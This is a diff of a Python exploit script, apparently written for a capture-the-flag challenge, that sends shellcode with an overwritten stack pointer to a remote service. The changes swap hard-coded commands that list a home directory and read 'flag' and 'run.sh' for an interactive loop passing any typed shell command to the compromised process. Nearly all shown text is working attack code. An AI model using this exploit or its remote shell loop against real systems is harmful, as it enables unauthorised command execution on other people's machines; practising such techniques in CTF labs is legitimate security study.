@@ -4,11 +4,16 @@ import struct
 import binascii
 
 def f_recv(s):
-    recv=s.recv(2048)
+    recv=None
+    try:
+        recv=s.recv(2048)
+    except Exception:
+        None
+    
     if not recv:
         print("no data received")
     else:
-        print("recv len="+str(len(recv))+", data="+str(recv))
+        print("recv len="+str(len(recv))+", data:\n"+str(recv))
     return recv
     
 def f_send(s,data):
@@ -96,12 +101,12 @@ def execute_payload():
     payload=shell+struct.pack('<I', 0x00000000)*(11-shell_dwords)+struct.pack('<I', stack_ptr-(7*4))    
 
     f_send(s,payload)
-    f_send(s,"cd /home/start;ls -l\n")
-    rcv=f_recv(s)            
-    f_send(s,"cat flag\n")
+    s.settimeout(1)
     rcv=f_recv(s)
-    f_send(s,"cat run.sh\n")
-    rcv=f_recv(s)          
+    while True :    
+        val=raw_input("enter shell command: ")
+        f_send(s,val+"\n")
+        rcv=f_recv(s)                
     s.close()   
    
 
